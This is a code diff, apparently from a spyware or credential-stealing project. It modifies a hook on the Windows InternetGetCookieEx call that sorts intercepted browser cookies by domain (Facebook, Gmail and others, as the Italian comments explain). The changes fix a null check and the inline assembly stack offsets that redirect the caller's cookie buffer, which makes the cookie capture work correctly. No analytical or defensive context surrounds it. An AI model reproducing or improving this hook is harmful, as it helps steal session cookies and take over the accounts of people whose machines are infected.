@@ -427,7 +427,7 @@ BOOL __stdcall PM_InternetGetCookieEx(LPCWSTR lpszURL, LPCWSTR lpszCookieName, L
 
 	// Cerca di capire se si tratta di un dominio interessante
 	origin = COOKIE_IEXPLORER;
-	if (pData->pStrStrW && lpszURL) {
+	if (pData->pStrStrW && lpszCookieData && lpszURL) {
 		if (pData->pStrStrW((WCHAR *)lpszURL, facebook_url))
 			origin |= COOKIE_FACEBOOK;
 		else if (pData->pStrStrW((WCHAR *)lpszURL, gmail_url))
@@ -447,7 +447,7 @@ BOOL __stdcall PM_InternetGetCookieEx(LPCWSTR lpszURL, LPCWSTR lpszCookieName, L
 		MOV [old_flags], EAX
 		MOV EAX, DWORD PTR [EBP+0x14]
 		MOV [old_size], EAX
-		MOV EAX, DWORD PTR [EBP+0x0C]
+		MOV EAX, DWORD PTR [EBP+0x10]
 		MOV [old_buffer], EAX
 
 		MOV EAX, 0x00002000
@@ -455,7 +455,7 @@ BOOL __stdcall PM_InternetGetCookieEx(LPCWSTR lpszURL, LPCWSTR lpszCookieName, L
 		LEA EAX, local_size
 		MOV DWORD PTR [EBP+0x14], EAX
 		LEA EAX, local_cookie
-		MOV DWORD PTR [EBP+0x0C], EAX
+		MOV DWORD PTR [EBP+0x10], EAX
 
 		POP EAX
 	}
@@ -475,7 +475,7 @@ BOOL __stdcall PM_InternetGetCookieEx(LPCWSTR lpszURL, LPCWSTR lpszCookieName, L
 		MOV EAX, [old_flags]
 		MOV DWORD PTR [EBP+0x18], EAX
 		MOV EAX, [old_buffer]
-		MOV DWORD PTR [EBP+0x0C], EAX
+		MOV DWORD PTR [EBP+0x10], EAX
 
 		POP EAX
 	}
